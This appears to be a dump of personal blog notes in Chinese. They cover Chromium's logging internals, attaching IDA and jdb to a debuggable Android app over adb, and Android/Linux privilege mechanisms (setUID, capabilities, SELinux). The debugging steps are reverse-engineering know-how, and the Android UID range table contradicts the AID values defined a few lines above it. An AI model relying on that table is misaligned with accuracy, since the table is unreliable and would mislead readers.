class=\"keyword\">struct</span> <span class=\"title class_\">timeval</span> tv;</span><br><span class=\"line\">    <span class=\"built_in\">gettimeofday</span>(&amp;tv, <span class=\"literal\">nullptr</span>);</span><br><span class=\"line\">    <span class=\"type\">time_t</span> t = tv.tv_sec;</span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">tm</span> local_time;</span><br><span class=\"line\">    <span class=\"built_in\">localtime_r</span>(&amp;t, &amp;local_time);</span><br><span class=\"line\">    stream_ &lt;&lt; std::<span class=\"built_in\">setfill</span>(<span class=\"string\">&#x27;0&#x27;</span>)</span><br><span class=\"line\">            &lt;&lt; std::<span class=\"built_in\">setw</span>(<span class=\"number\">2</span>) &lt;&lt; <span class=\"number\">1</span> + local_time.tm_mon</span><br><span class=\"line\">            &lt;&lt; std::<span class=\"built_in\">setw</span>(<span class=\"number\">2</span>) &lt;&lt; local_time.tm_mday</span><br><span class=\"line\">            &lt;&lt; <span class=\"string\">&#x27;/&#x27;</span></span><br><span class=\"line\">            &lt;&lt; std::<span class=\"built_in\">setw</span>(<span class=\"number\">2</span>) &lt;&lt; local_time.tm_hour</span><br><span class=\"line\">            &lt;&lt; std::<span class=\"built_in\">setw</span>(<span class=\"number\">2</span>) &lt;&lt; local_time.tm_min</span><br><span class=\"line\">            &lt;&lt; std::<span class=\"built_in\">setw</span>(<span class=\"number\">2</span>) &lt;&lt; local_time.tm_sec</span><br><span class=\"line\">            &lt;&lt; <span class=\"string\">&#x27;.&#x27;</span></span><br><span class=\"line\">            &lt;&lt; std::<span class=\"built_in\">setw</span>(<span class=\"number\">6</span>) &lt;&lt; tv.tv_usec</span><br><span class=\"line\">            &lt;&lt; <span class=\"string\">&#x27;:&#x27;</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (g_log_tickcount)</span><br><span class=\"line\">    stream_ &lt;&lt; <span class=\"built_in\">TickCount</span>() &lt;&lt; <span class=\"string\">&#x27;:&#x27;</span>;</span><br><span class=\"line\">  stream_ &lt;&lt; <span class=\"built_in\">log_severity_name</span>(severity_) &lt;&lt; <span class=\"string\">&quot;:&quot;</span> &lt;&lt; file &lt;&lt; <span class=\"string\">&quot;(&quot;</span> &lt;&lt; line &lt;&lt; <span class=\"string\">&quot;)] &quot;</span>;</span><br><span class=\"line\">  message_start_ = stream_.<span class=\"built_in\">str</span>().<span class=\"built_in\">length</span>();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>此代码会将日志头部信息输出到 stream_ 中。</p>\n<p>3.3 ~LogMessage 析构函数输出日志</p>\n<p>当 LogMessage 对象析构时，~LogMessage 会调用日志输出流程：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">LogMessage::~<span class=\"built_in\">LogMessage</span>() &#123;</span><br><span class=\"line\">  <span class=\"function\">std::string <span class=\"title\">str_newline</span><span class=\"params\">(stream_.str())</span></span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (log_message_handler &amp;&amp;</span><br><span class=\"line\">      <span class=\"built_in\">log_message_handler</span>(severity_, file_, line_,</span><br><span class=\"line\">                          message_start_, str_newline)) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ((g_logging_destination &amp; LOG_TO_SYSTEM_DEBUG_LOG) != <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">if</span> defined(OS_ANDROID)</span></span><br><span class=\"line\">    __android_log_write(ANDROID_LOG_INFO, <span class=\"string\">&quot;chromium&quot;</span>, str_newline.<span class=\"built_in\">c_str</span>());</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">else</span></span></span><br><span class=\"line\">    <span class=\"built_in\">ignore_result</span>(<span class=\"built_in\">fwrite</span>(str_newline.<span class=\"built_in\">data</span>(), str_newline.<span class=\"built_in\">size</span>(), <span class=\"number\">1</span>, stderr));</span><br><span class=\"line\">    <span class=\"built_in\">fflush</span>(stderr);</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ((g_logging_destination &amp; LOG_TO_FILE) != <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">    LoggingLock logging_lock;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"built_in\">InitializeLogFileHandle</span>()) &#123;</span><br><span class=\"line\">      <span class=\"built_in\">ignore_result</span>(<span class=\"built_in\">fwrite</span>(str_newline.<span class=\"built_in\">data</span>(), str_newline.<span class=\"built_in\">size</span>(), <span class=\"number\">1</span>, g_log_file));</span><br><span class=\"line\">      <span class=\"built_in\">fflush</span>(g_log_file);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (severity_ == LOG_FATAL) &#123;</span><br><span class=\"line\">    base::debug::<span class=\"built_in\">BreakDebugger</span>();</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<pre><code>•    在 Android 上，使用 __android_log_write 写入系统日志。\n•    在其他平台上，会根据配置写入 stderr 或日志文件。\n</code></pre>\n<p>总结</p>\n<pre><code>1.    宏展开：LOG(INFO) &lt;&lt; &quot;init first stage started!&quot; 依次展开为 LAZY_STREAM、LOG_STREAM、COMPACT_GOOGLE_LOG_INFO，最终生成一个 LogMessage 对象并调用其 stream()。\n2.    构造与格式化：LogMessage 对象在构造时会调用 Init 函数，格式化头部信息。\n3.    日志输出：对象析构时，~LogMessage 检查配置，选择写入到系统日志、stderr 或文件中。\n</code></pre>\n"},{"_content":"ida调试 https://bbs.kanxue.com/thread-259633.htm\n\n1. ida 的 android_service 文件push 到手机中\n2. 开启 android_service\n3. ida导入将要调试的so文件\n4. 端口转发 \n   adb forward tcp:23946 tcp:23946\n5. 以调试模式开启app\n   adb shell am start -D -n com.nuoen.attacker/.MainActivity\n6. 获取attacker的进程号31142,jdwp转端口（教程中的ddms）\n   adb forward tcp:8700 jdwp:31142\n\n   jdb -connect com.sun.jdi.SocketAttach:hostname=localhost,port=8700 ?\n   无反应\n   为什么无反应：因为开了android studio (吐血)\n","source":"_drafts/IDA.md","raw":"ida调试 https://bbs.kanxue.com/thread-259633.htm\n\n1. ida 的 android_service 文件push 到手机中\n2. 开启 android_service\n3. ida导入将要调试的so文件\n4. 端口转发 \n   adb forward tcp:23946 tcp:23946\n5. 以调试模式开启app\n   adb shell am start -D -n com.nuoen.attacker/.MainActivity\n6. 获取attacker的进程号31142,jdwp转端口（教程中的ddms）\n   adb forward tcp:8700 jdwp:31142\n\n   jdb -connect com.sun.jdi.SocketAttach:hostname=localhost,port=8700 ?\n   无反应\n   为什么无反应：因为开了android studio (吐血)\n","slug":"IDA","published":0,"date":"2024-03-17T18:16:32.466Z","updated":"2024-03-21T12:25:26.038Z","title":"","comments":1,"layout":"post","photos":[],"link":"","_id":"cmd44risy0004v8fy40sbbx7c","content":"<p>ida调试 <a href=\"https://bbs.kanxue.com/thread-259633.htm\">https://bbs.kanxue.com/thread-259633.htm</a></p>\n<ol>\n<li><p>ida 的 android_service 文件push 到手机中</p>\n</li>\n<li><p>开启 android_service</p>\n</li>\n<li><p>ida导入将要调试的so文件</p>\n</li>\n<li><p>端口转发<br>adb forward tcp:23946 tcp:23946</p>\n</li>\n<li><p>以调试模式开启app<br>adb shell am start -D -n com.nuoen.attacker/.MainActivity</p>\n</li>\n<li><p>获取attacker的进程号31142,jdwp转端口（教程中的ddms）<br>adb forward tcp:8700 jdwp:31142</p>\n<p>jdb -connect com.sun.jdi.SocketAttach:hostname=localhost,port=8700 ?<br>无反应<br>为什么无反应：因为开了android studio (吐血)</p>\n</li>\n</ol>\n","site":{"data":{}},"cover":false,"excerpt":"","more":"<p>ida调试 <a href=\"https://bbs.kanxue.com/thread-259633.htm\">https://bbs.kanxue.com/thread-259633.htm</a></p>\n<ol>\n<li><p>ida 的 android_service 文件push 到手机中</p>\n</li>\n<li><p>开启 android_service</p>\n</li>\n<li><p>ida导入将要调试的so文件</p>\n</li>\n<li><p>端口转发<br>adb forward tcp:23946 tcp:23946</p>\n</li>\n<li><p>以调试模式开启app<br>adb shell am start -D -n com.nuoen.attacker/.MainActivity</p>\n</li>\n<li><p>获取attacker的进程号31142,jdwp转端口（教程中的ddms）<br>adb forward tcp:8700 jdwp:31142</p>\n<p>jdb -connect com.sun.jdi.SocketAttach:hostname=localhost,port=8700 ?<br>无反应<br>为什么无反应：因为开了android studio (吐血)</p>\n</li>\n</ol>\n"},{"_content":"> 本笔记为安全体系与 Android 平台权限/签名机制速记。**最近一次校对：2025-09（基于 Android 15 / API 35 现状）**。文末与相关章节已补充近年重要变更：APK 签名 v2/v3/v4、分区存储、包可见性、运行时权限调整、前台服务限制、精确闹钟权限等。\n\n扎绳篇：\n非对称密码 公钥体系\n证书 \n包含公钥，公钥是利用证书来传递的\n\n利用签名来保护数字证书本身\n\n人的信任关系：一个信任人的列表\n数字时代的信任关系：一个受信任者的证书列表\n\n人的信任链：孔子-》孔子的徒弟-》孔子的徒弟的徒弟\n数字时代的信任链：证书链\n证书签名的不同点：根证书自签名，非根证书父签名\n证书的限制：\n    约束\n    用途\n    有效期\nPKI的概念\n\n基于可信任证书的认证方式被广泛的应用在现代安全领域，比如WIFI，HTTPS\n在HTTPS中，典型的Client对Server的认证和鉴别基于可信任列表\n织网篇:\n# 进程和进程边界\n## 进程和线程\n可执行文件：不活动就是废物\n进程：可执行文件的活动表现，一次生命的历练，资源的最小单位\n线程：CPU(核)的调度单位,并发的执行序列，进程的多管齐下\n资源和调度\n## 手机操作系统的发展\nFeature Phone 时代的实时简单的单进程多任务非智能系统\nSmart Phone 时代的多进程多任务智能系统\n## 进程的地址空间边界\n每个进程的虚拟地址空间0-4G（32位），每个进程的物理地址空间是独立的\n\n## 进程边界的安全围栏：Crash的不可扩展性\n## 进程边界的安全围栏：全局数据和服务的不可访问性\n回顾和总结\n\n# 多用户和多用户边界\n## 需求背景\n资源缺乏\n中央统一管理\n## 多用户的边界：独立的工作目录\n独立的老巢\n/home/nuoen\n## 多用户的边界：可操作/访问的资源\n资源分类\n权限管理\n## 多用户的边界：可执行的操作\n操作分类\n权限管理\n## 多用户的边界：UID和GID\nName只是供看的\nIdentifier才是系统层面的标识\n用户的行为是一系列进程的行为\n特性标识其实是进程的UID/GID\n\n# 进程和文件的UID/GID\n## 文件资源的权限力度：UID/GID\n* 文件是一种资源\n* 在Linux中，甚至一切皆是文件，Socket,Driver\n* 文件资源对不同Target(用户)的不同操作权限的需求应运而生\n* 如何描述和区分不同的target? ID=====》UID===》唯一的\n* 某些场景下，允许多个不同的Target/用户 (而不是一个)具有一致的操作权限，怎么办？ID---->GID---->多个用户可以属于一个GID，一个用户可以属于多个GIDs\n* 所以文件权限的管理力度区分为3类群体：属于特定UID的用户，属于特定GID的用户（们），其他用户\n* 一个上帝用户存在：ROOT，其UID=0，上帝用户永远满足属于任何UID\n```\nps -eo pid,uid,gid,user,args\n```\n## 文件的可操作权限\n文件/文件夹的可读\n文件/文件夹的可写\n文件/文件夹的可执行\n```\nls -l \n是否是文件夹|Owner用户权限|非Owner用户但是相同的组用户权限|既不是Owner用户也不是相同组的用户权限\n*|***|***|***   UID  GID\ndrwxr-xr-x  2 root  root        4096 Apr 22  2024  mnt\ndrwxrwxr-x 29 nuoen nuoen       4096 Jun  7 04:55  msm\n-rw-------  1 nuoen nuoen          0 May 20 11:20  nohup.out\n```\n## 进程的标识：PID,UID,GID,GIDs\nPID:进程的Unique Identifier。每次Running的PID可能相同，或者不同，由系统分配\nUID:进程的身份标识。每次运行，即便重启后默认都相同。不同进程允许有相同的UID(用户身份标识)\nGID:进程的（组）身份标识。每次运行，即便重启后默认都相同。不同进程允许有相同的GID(组用户身份标识)。同一进程允许属于多个GID\nGIDs:进程所属的全部GID\n\n## Name 和 ID的映射\nandroid_filesystem_config.h\n```c\n/* This is the master Users and Groups config for the platform.\n * DO NOT EVER RENUMBER\n */\n\n#define AID_ROOT 0 /* traditional unix root user */\n/* The following are for LTP and should only be used for testing */\n#define AID_DAEMON 1 /* traditional unix daemon owner */\n#define AID_BIN 2    /* traditional unix binaries owner */\n\n#define AID_SYSTEM 1000 /* system server */\n\n#define AID_RADIO 1001           /* telephony subsystem, RIL */\n#define AID_BLUETOOTH 1002       /* bluetooth subsystem */\n#define AID_GRAPHICS 1003        /* graphics devices */\n#define AID_INPUT 1004           /* input devices */\n#define AID_AUDIO 1005           /* audio devices */\n#define AID_CAMERA 1006          /* camera devices */\n#define AID_LOG 1007             /* log devices */\n\n\n/* The 3000 series are intended for use as supplemental group id's only.\n * They indicate special Android capabilities that the kernel is aware of. */\n#define AID_NET_BT_ADMIN 3001 /* bluetooth: create any socket */\n#define AID_NET_BT 3002       /* bluetooth: create sco, rfcomm or l2cap sockets */\n#define AID_INET 3003         /* can create AF_INET and AF_INET6 sockets */\n#define AID_NET_RAW 3004      /* can create raw INET sockets */\n\n#define AID_APP 10000       /* TODO: switch users over to AID_APP_START */\n/** android apk 的uid都是10000开始的 **/\n\n```\n📌 Android UID 分配机制概览\nUID 范围\t用途\t示例\n0 – 999\t内核 / root / 守护进程\t0=root, 100=logd\n1000 – 1999\t系统服务 / 框架进程\t1000=system\n2000 – 2999\t硬件守护程序\t2000=radio, 2001=bluetooth\n3000 – 9999\t其他核心服务（AID_*）\t3004=audioserver, 1073=networkstack\n10000 以上\t普通 APK 应用\t10123=com.x.app\n\n\n📦 普通应用为什么是 10000+？\n\t•\t安装 APK 时，如果没有 <sharedUserId>：\n\t•\tPackageManager 自动从 10000 开始为应用动态分配 UID。\n\t•\t多用户模式下会按：\n\napp_uid = user_id * 100000 + app_id\n\n\n\t•\t如果有 <sharedUserId>，且不是 AID 预定义的 UID：\n\t•\t必须满足条件：系统签名 + 安装在 system/priv-app。\n\t•\t否则系统拒绝安装。\n\n⸻\n## chmod 和 chown 命令介绍\n文件R/W/X的系统内部采用3Bit表示，R为最高位比特，置位为0x04,W为中间比特，置位为0x02,X为最低位比特，置位为0x01\nshell中表示时，置位使用相应R/W/X表示，未置位使用-\n操作文件面向群体的操作权限时，使用Chomd，可以直接使用数字，也可以使用助记符\n(a:all ,u:owner user,g:group, +:add one permission, -:remove one permission)\n\nchown 命令用于改变文件的所有者和所属组(UID和GID)\nSHELL命令中通常采用Name方式修改，而不是ID方式\n一般格式： chown newUID : newGID FileName\n\n```shell\nchown system:system nohup.out\n```\n## UID/GID的衔接\nLinux一切皆是文件\n文件基于UID/GID来划分它的面向群体，对它的面向群体定义不同的操作权限\n用户的行为映射为进程的运行\n进程的运行使用进程的UID/GID来标识自己的身份\n进程的UID/GID<=======>文件的UID/GID 完美衔接！！\n进程的UID/GID除了被授予可操作文件的范畴外，非文件范畴的需要进行权限控制的操作（如重启系统等特权操作）继续通过进程的UID/GID身份来进行控制和授权\n比如，对于Reboot这个API,其入口处可以check calling的Process的UID,如果不是Root，则Reject\n\n # 进程的 Real UID 和 Effective UID\n## 身份的标识：Real UID\n* 进程的UID只是泛称，其实有很多种不同的UID\n* 进程的Real UID是进程的身份的标识，用来说明 Who am I\n* 仅仅说明Who am I,但是没有“实权”是不行的\n* Linux中，进程能做什么事情不是由Real UID决定的\n* Real UID仅仅是身份，有身份没有权利是无用的\n## 权利的标识：Effective UID\n* 有身份无权利是不行的\n* Effective UID是进程的权利的标识，标识了该进程的“权利”\n* Linux中的进程的授权（即，当前进程具有的操作权限）是靠Effective UID来识别的\n* 有权利就能做一切，Linux中具有“特权”Effective UID的进程能为所欲为\n* 之前课时说明的，文件，资源以及特权API操作时对进程是否有权限的识别的UID,即是指Effective UID\n## 身份和权利的关系\n* 一般情况下，身份和权利是一致的，即 Real UID = Effective UID\n* 所以，默认PS CMD 输出的UID指的是Effective UID,而没有输出Real UID\n```shell\nps aux\nUSER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nroot           1  0.0  0.0 170644 14180 ?        Ss   Jun28   0:51 /sbin/init splash\nroot           2  0.0  0.0      0     0 ?        S    Jun28   0:00 [kthreadd]\nroot           3  0.0  0.0      0     0 ?        I<   Jun28   0:00 [rcu_gp]\nroot           4  0.0  0.0      0     0 ?        I<   Jun28   0:00 [rcu_par_gp]\n```\n* 我们也可以显式的显示完整的Effective UID 和 Real UID\n```shell\n# 查看所有进程的真实/有效 UID、GID\nps -eo pid,ruid,euid,rgid,egid,user,comm\n\n# 仅看某个 PID（示例：1234）\nps -o pid,ruid,euid,rgid,egid,cmd -p 1234\n\n# 从 /proc 读取（同时可见 Capability）\ncat /proc/1234/status | egrep 'Uid:|Gid:|Cap(Inh|Prm|Eff)'\n```\n## ROOT用户的特权\n* 我们所指的root用户，均是Effective UID = root的进程，尽管一般情况下，Real UID = Effective UID\n* Effective UID = root的进程具有“皇权”，他不受任何限制，可以为所欲为\n* 它可以为自己正身：如果自己的身份（Real UID）不是root，它可以将自己的身份名正言顺的改为root(调用SetXUID),从而使身份和权利均是root\n* 它也可以自降为庶民：出家皈依，将自己的Real UID 和 Effective UID 都设置（降低，也是调用SetXUID）为庶民（非特权普通的Real UID,Effective UID），从而失去特权.\n## UID的世袭\n* 在linux世界里，为了安全考虑，UID的世袭遵循：身份世袭而权利不世袭的准则\n* 子进程的Real UID = Effective UID = 父进程的Real UID\n* 这使得临时夺权且尚位正身（普通Real UID 而特权Effective UID）的进程的子嗣不能继承其特权而仅能继承其的正身 （Real UID）\n\n# 文件setUID标识\n## 平民身份、皇族特权的需求背景\n* Linux中的password是一个可执行程序（CMD），用于修改用户的密码\n* Passwd需要操作多用户的账号文件（该文件高度安全，仅有ROOT用户可以读写）\n* 普通用户难道不能修改自己的密码？\n* Passwd进程虽然是平民身份（普通用户启动它），却需要皇族的权利。身份和权利不一致。\n## 如何解决\n临时提升特权（Effective UID = root）而维持身份不变（Real UID = 普通用户），使得其利用特权行使职责时可避免世袭的安全问题。\n## Linux的文件setUID标识\n* 文件的Owner UID设置为特殊用户，比如ROOT\n* 文件面向Owner UID的群体（第一组标志）的操作权限增加额外的setUID标识\n* Linux系统保证，任何用户（进程）执行该可执行文件（会Fork一个新的进程来加载该可执行文件running）时，该可执行文件所在的子进程的Real UID仍然继承其父进程的Real UID，但是其Effective UID不再等于其父的Real UID而是被提升到该可执行文件的Owner UID\n```shell\nls -l | grep passwd\n-rwsr-xr-x 1 root root         88464 Feb  6  2024 gpasswd\n-rwxr-xr-x 1 root root        254160 Dec  2  2022 grub-mkpasswd-pbkdf2\n-rwsr-xr-x 1 root root         68208 Feb  6  2024 passwd\n```\n## Chomd设置setUID的方式\n* 和基本的RWX设置类似，有助记符和直接数字设置。直接数字设置时，采用4位数字，其中第一位标志setUID\n```shell\nchmod 4775 xxx.file //设置setUID\nchmod 0775 xxx.file //取消setUID\n```\n## setUID的安全问题\n* sUID的进程的EUID提升了\n* sUID的进程的RUID默认没有提升\n* 在sUID进程的RUID没有正身（也设置为ROOT）之前，其子民的RUID/EUID只是平民,此时是安全的\n* 要依据实际场景，有限制的决定是否要在sUID进程中为自己正身，需要明确知道其后果是，其任何子民的RUID/EUID均会提升至贵族（ROOT）\n* 两个例子，passwd（未正身），Android的su（正身）\n## 有RealGID,EffecitveGID,setGID吗\n* 存在，待看\n\n## 文件 Capability（setcap/getcap）\n* 除了 setUID 之外，现代 Linux/Android 更推荐使用 **文件 Capability** 赋权，避免一刀切的 root 特权。\n* 常用命令：\n```shell\n# 赋予二进制绑定低端口能力（示例）\nsudo setcap 'cap_net_bind_service=+ep' /path/to/bin\n# 查看文件能力\ngetcap /path/to/bin\n```\n* 在 Android 上，系统分区的二进制能力通常由构建系统打包时附加；第三方 App 无法随意为自身可执行文件设置 capability。\n\n如此管理权限颗粒度太粗，不够精细，所以引入了Capability机制\n\n# Linux的Capability机制\n## UID怎么了\n* 权限颗粒太粗\n* 容易引起权利过剩（溢出）\n* 权利溢出/过剩引起的安全问题\n## Capability:细粒度的权限控制\n* 我们需要细粒度的权限\n* 除了皇帝，我们也需要不同的地方官\n* Linux引入了Capability:每个Capability系统内以一位Bit代表，OS内部使用64bit存储\n```c\n//android_filesystem_capability.h\n#define CAP_CHOWN 0\n#define CAP_DAC_OVERRIDE 1\n#define CAP_DAC_READ_SEARCH 2\n#define CAP_FOWNER 3\n#define CAP_FSETID 4\n#define CAP_KILL 5\n#define CAP_SETGID 6\n#define CAP_SETUID 7\n#define CAP_SETPCAP 8\n#define CAP_LINUX_IMMUTABLE 9\n#define CAP_NET_BIND_SERVICE 10\n#define CAP_NET_BROADCAST 11\n#define CAP_NET_ADMIN 12\n#define CAP_NET_RAW 13\n#define CAP_IPC_LOCK 14\n#define CAP_IPC_OWNER 15\n#define CAP_SYS_MODULE 16\n#define CAP_SYS_RAWIO 17\n#define CAP_SYS_CHROOT 18\n#define CAP_SYS_PTRACE 19\n#define CAP_SYS_PACCT 20\n```\n## 进程的Capability\n* Permitted Capability Sets\n  * 当前进程的权利的围栏，最大权利范围，是Effecitve Capability Sets的超集\n* Effective Capability Sets\n  * 当前进程的时机使用（支配）的权利集，该集内的Capability必须从属于Permitted Capability Sets。该集合与Effective UID类似，是实际的权利标识\n* Inheritable Capability Sets\n  * 子进程唯一可以直接继承的Capability Sets。在Capability模式下，只有子进程的Inheritable Capability Sets = 父进程的Inheritable Capabiltity Sets。其他皆是NO\n## 文件的Capability\n* Permitted Capability Sets\n  * 该可执行文件可以为其进程带来的Permitted Capability Sets\n* Effective Capability Set\n  * 仅1bit,Enable or Disable ,标识该可执行文件running所在的进程的Permitted Capability Sets是否自动全部Assign到其Effective Capability Sets。通常用于与传统的Root-setUID可执行文件向下兼容。\n* Inheritable Capability Sets\n  * 与进程的Inheritable Capability Sets一起作用（位与）以决定新的进程的Permitted Capability Sets\n## Capability BoundSet\n* Capability BoundSet是进程的超集\n* 是进程自己为自己设定的安全围栏（Capability Sets），限制可执行文件的Permitted Capability Sets仅有局部能转化为进程的Permitted Capability Sets\n* Capability BoundSet能够被子进程继承\n* Init进程默认Capability BoundSet 为全1\n## Spawn进程的Capability\nP'(permitted) = (P(inheritable) & F(inheritable)) | (F(permitted) & cap_bset)\nP'(effective) = F(effective)?P'(permitted):0\nP'(inheritable) = P(inheritable)\n```shell\ncat /proc/[pid]/status | grep Cap\n```\n# Capability与UID的兼容\n* 新技术必须向下（前）兼容，要保证旧的实体（应用）工作正常\n* 旧的应用：Capability - dumb进程\n  Permitted Capability Sets = Effective Capability Sets = Inheritable Capability Sets = 0x000000000000000,我不知道，我怎么设置？\n* 旧的可执行文件：Capability - dumb文件:\n  Root-setUID可执行文件，系统转变为Capability的方式为：File Effective Bit = True;File 's Permitted和Inheritable Capability Sets = 0xFFFFFFFFFFFFFFFF\n* 旧的 Root EUID 的进程：对使用 v1（JAR）签名时代的 setUID 兼容，**File Effective Bit = true** 时仍会将文件的 Permitted 能力集赋予进程（受 BoundSet 限制）。\n* 注意：公式中的常量应为 **PR_CAPBSET**（capability bound set），不是 PR_CAPBEST。\n# 高级特性\n## 被ROOT了怎么办\n* 手机被ROOT了怎么办\n* 恶意应用获取了ROOT权限怎么办？\n* 现在无能为力\n* 我们想怎么样？即便ROOT EUID的应用，仍然不能为所欲为\n## SELinux\n* 拯救英雄\n* DAC和MAC的策略区别\n* DAC(Discretionary Access Control)自主访问控制：传统U6 m0k9noijnix/Linux安全管理模型；主体对它所属的对象和运行的程序拥有全部的控制权\n* MAC(Mandatory Access Control)强制访问控制：SELinux基于的安全策略；管理员管理访问控制。管理员指定策略，用户不能改变它。策略定义了哪个主体能访问哪个对象。采用最小特权方式，默认情况下应用程序和用户没有任何权限\n* Web服务器的假想例子\nDAC模式下，Web服务器进程具有ROOT权限，当恶意病毒攻击成功并注入Web服务器进程后，则可以利用Web服务器进程的ROOT权限，做任何事情。\nMAC模式下：Web服务器进程所能操作的对象和权限均在安全策略中明确列出，比如，只允许访问网络和访问特定文件等。即便Web服务器被恶意病毒攻击注入了，你仍然无法借由Web服务器进程为所欲为，所有安全策略没有授权的行为仍然是不允许的。\n## SEAndroid\n* 与SELinux的关系\nSEAndroid (Security-Enhanced Android) 将原本运用在Linux上的SELinux技术移植到了Android平台上\n* 与SELinux的区别\n  除了移植SELinux以外，还做了很多针对Android的安全提高，比如把Binder IPC、Socket、Properites访问控制加入到了SEAndroid的控制中。\n* SEAndroid的核心理念\n  即使恶意应用篡得了ROOT权限，恶意应用仍然被优先的控制着仍然不能为所欲为。\n\n## Jelly Bean MR2（Android 4.3）的补丁（setUID 提权收紧）\n* 在 Android 4.3 之前，APK 进程能通过 `Runtime.exec()` 执行 **root-setUID** 二进制并提升 EUID。\n* 4.3 起，Zygote 在 fork 应用进程时**清空 Capability Bound Set**，使后续执行 setUID 文件时即使 EUID 改变，也**无实际 capability**可用。\n* 关键逻辑位于 Zygote 分支（Dalvik/ART 不同版本位置不同），等价于：\n```c\n// 伪代码：清空 PR_CAPBSET（capability bound set）\nfor (int i = 0; prctl(PR_CAPBSET_READ, i, 0, 0, 0) >= 0; i++) {\n    prctl(PR_CAPBSET_DROP, i, 0, 0, 0);\n}\n```\n* 结论：普通 APK 进程执行 root-setUID 二进制不再具备有效的 capability，无法借此获取特权。\n\n### JB MR2 细节（扩展版）\n**动机**  \n早期（4.2 及之前）APK 进程可通过 `Runtime.exec()`/`fork+exec` 执行带 **setUID-root** 位的二进制，从而把子进程的 **EUID 提升为 0**，再借助传统 root 权限做特权操作。为阻断这一途径，Android 4.3 在 Zygote 派生应用进程后，对 **Capability Bound Set（BSET）** 进行清空，使随后即便执行 setUID 文件，进程也**拿不到任何有效的 capability**。\n\n**内核前提**  \n* 依赖 Linux 的 **Capability Bounding Set** 机制（`prctl(PR_CAPBSET_DROP, cap)`）。  \n* 当某 capability 被从 BSET 中 drop 后，后续**不可再添加**到该进程的 Permitted 集（除非通过 exec 进入 `init`/更高权限环境，但普通 APK 不具备）。\n\n**Zygote 侧变化（伪代码）**  \n```c\n// 在 fork 普通应用进程后（进入 app uid/gid 环境前后），遍历所有 capability：\nfor (int cap = 0; prctl(PR_CAPBSET_READ, cap, 0, 0, 0) >= 0; ++cap) {\n    prctl(PR_CAPBSET_DROP, cap, 0, 0, 0);  // 将 BSET 清空\n}\n// 随后再 setresgid / setresuid 至应用 uid/gid，清空附属组等。\n// 注意：JB MR2 当时并**未**依赖 PR_SET_NO_NEW_PRIVS（较新内核才有），主要手段就是清空 BSET。\n```\n\n**能力传播公式回顾**  \n对一次 `execve(file)`，新的进程 capability 计算（简化）为：\n```\nP' = (P_inh & F_inh) | (F_perm & BSET)\nE' = F_eff ? P' : 0\nI' = P_inh   // 仅 Inheritable 可直接继承\n```\n* 其中 `F_*` 来自**目标可执行文件**的 capability，`P_*` 为**当前进程**；`BSET` 为 **Capability Bound Set**。\n* 当 **BSET = 0** 时，无论 `F_perm` 多大、`F_eff` 是否置位，`P'` 都只能来源于 `P_inh & F_inh`。而普通 APK 的 `P_inh` 默认为 0，故 `P' = 0`，`E' = 0`。\n\n**对 setUID-root 的具体影响**  \n* setUID 仍会令子进程的**EUID 变为 0**（身份层面），但由于 `P'=0`、`E'=0`，进程**没有任何有效 capability**，无法执行需要 capability 的特权操作（例如 `CAP_SYS_ADMIN`、`CAP_SYS_MODULE` 等）。\n* 这等价于：**“看起来像 root，实则无权”**，从根本上堵住了通过 setUID 提权的常见路径。\n\n**前/后对比（示例）**  \n* *JB MR2 之前（BSET=全 1）*：\n  - `F_eff=1`、`F_perm` 含若干能力 → `P'` 至少获得 `F_perm & BSET`，再赋给 `E'`，子进程具备相应特权。\n* *JB MR2 之后（BSET=0）*：\n  - 即便 `F_eff=1`，也因 `F_perm & 0 = 0` → `P'=0`、`E'=0`。\n\n**如何验证**  \n1. 在 APK 内部 `exec` 一个 setUID-root 的小程序：\n   ```shell\n   id; cat /proc/$$/status | egrep 'Uid:|Gid:|Cap(Inh|Prm|Eff)'\n   ```\n   可见 `Uid:` 的 `EUID` 为 0，但 `CapEff:` 为全 0。  \n2. 改为在 `adb shell`（root 环境）直接运行同一程序（不经 Zygote app 沙盒）对比其 `CapEff`，能观察到差异。\n\n**补充说明**  \n* 这一设计与后续版本中的 **SELinux（Enforcing）**、**权限拆分/前台服务限制** 等共同组成多层防护。  \n* 后续 Android/内核版本也引入了 `no_new_privs` 等手段，但 **JB MR2 的关键变化点就是清空 BSET**。\n\n捕鱼篇\n# 签名和权限\n## 移动平台中的主流签名作用：自签名的完整性鉴别\n* 什么是自签名\n  证书是用来证明公钥拥有者的身份信息，一般由可信的第三方机构颁发，三方机构用自己的私钥签名拥有者的公钥，从而证明该证书的有效性\n  证书的签名一般是由证书的颁发者的私钥签名\n  